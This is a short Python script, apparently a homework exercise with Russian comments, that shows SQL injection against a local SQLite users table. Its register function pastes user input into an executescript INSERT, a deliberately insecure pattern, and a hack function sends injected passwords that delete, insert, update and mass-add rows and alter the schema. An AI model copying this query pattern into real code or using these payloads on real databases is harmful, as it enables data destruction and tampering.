import sqlite3
# -*- coding: utf-8 -*-

def register(username: str, password: str) -> None:
    with sqlite3.connect('hw.db') as data_base:
        cursor = data_base.cursor()
        cursor.executescript(
            f"""
            INSERT INTO 'table_users' (username, password)
            VALUES ('{username}', '{password}')
            """
        )
        data_base.commit()

def hack():
    #удаление записей таблицы
    username: str = 'sdsd'
    password: str = "'); DELETE FROM table_users;--"
    register(username, password)

    #добавление записей в таблицу
    password: str = "'); INSERT INTO table_users (username, password) VALUES ('kek', 'lol');--"
    register(username, password)

    #изменение записей таблицы
    password: str = "'); UPDATE table_users SET password = ':)' WHERE username = 'sdsd';--"
    register(username, password)

    #изменение схемы таблицы
    password: str = "'); ALTER TABLE table_users ADD COLUMN fake_column;--"
    register(username, password)

    #добавление большого числа новых записей в таблицу
    values = str([('owo', 'uwu')] * 100)[1:-1]
    password: str = f"'); INSERT INTO table_users (username, password) VALUES {values};--"
    register(username, password)

    #удаление всех записей в таблице
    password: str = f"'); DELETE FROM table_users;--"
    register(username, password)


if __name__ == '__main__':
    hack()